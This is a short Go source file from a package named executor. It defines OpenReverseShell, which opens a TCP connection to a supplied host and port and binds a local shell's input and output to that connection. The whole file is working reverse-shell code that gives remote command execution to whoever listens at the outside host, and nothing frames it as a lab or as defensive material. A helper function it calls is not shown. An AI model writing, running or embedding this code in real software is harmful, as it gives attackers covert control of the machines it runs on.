// Contains logic for a reverse shell
package executor

import (
	"fmt"
	"net"
	"os/exec"
)

// OpenReverseShell opens an OS agnostic reverse shell to a listening host
func OpenReverseShell(ip, port string) error {
	// IP:Port
	addr := net.JoinHostPort(ip, port)

	// Opens a tcp connection to the above host
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Pipe stdin, stdout, and stderr to the connection and execute a shell
	cmd := exec.Command(getShell())
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Run the command
	cmd.Run()

	return nil
}
